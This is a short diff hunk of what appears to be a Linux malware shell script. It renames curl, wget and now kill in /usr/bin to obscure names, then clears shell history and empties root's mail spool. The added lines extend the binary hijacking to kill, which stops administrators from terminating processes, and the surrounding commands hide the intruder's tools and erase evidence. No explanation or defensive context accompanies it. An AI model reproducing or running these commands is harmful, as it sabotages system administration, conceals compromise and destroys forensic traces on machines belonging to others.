@@ -896,10 +896,15 @@ bbdir="/usr/bin/curl"
 bbdira="/usr/bin/cd1"
 ccdir="/usr/bin/wget"
 ccdira="/usr/bin/wd1"
+ccdir="/usr/bin/kill"
+ccdira="/usr/bin/kl1"
 mv /usr/bin/curl /usr/bin/url
 mv /usr/bin/url /usr/bin/cd1
 mv /usr/bin/wget /usr/bin/get
 mv /usr/bin/get /usr/bin/wd1
+mv /usr/bin/kill /usr/bin/kib
+mv /usr/bin/kib /usr/bin/kl1
+
 
 history -c
 echo > /var/spool/mail/root
